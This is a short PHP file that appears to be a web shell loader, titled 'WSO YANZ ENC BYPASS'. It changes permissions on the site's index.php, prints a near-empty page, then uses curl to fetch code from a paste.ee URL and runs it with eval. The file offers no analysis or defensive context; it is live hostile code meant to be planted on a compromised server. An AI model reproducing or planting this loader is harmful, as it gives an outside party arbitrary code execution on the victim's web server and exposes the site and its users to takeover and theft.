<?php
session_start();
$index = $_SERVER['DOCUMENT_ROOT'].'/index.php';
chmod ($index , 0644);
echo '<!DOCTYPE html>';
echo '<html>';
echo '';
echo '<head>';
echo '<meta charset="utf-8" />';
echo '';
echo '<title>';
echo $_SERVER['HTTP_HOST'].'--'.'WSO YANZ ENC BYPASS';
echo '</title>';
echo '';
echo '<!-- add icon link -->';
echo '<link rel="icon" href=';
echo '"https://raw.githubusercontent.com/xyndicategaming/wpfile/main/logo24cr2.png"';
echo 'type="image/x-icon">';
echo '';
echo '</head>';
echo '';
echo '<body>';
echo '</body>';
echo '';
echo '</html>';
?>
<?php
$url = "https://paste.ee/r/iXIbV";
$ch = curl_init($url); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result = curl_exec($ch);
eval("?>".$result);

?>
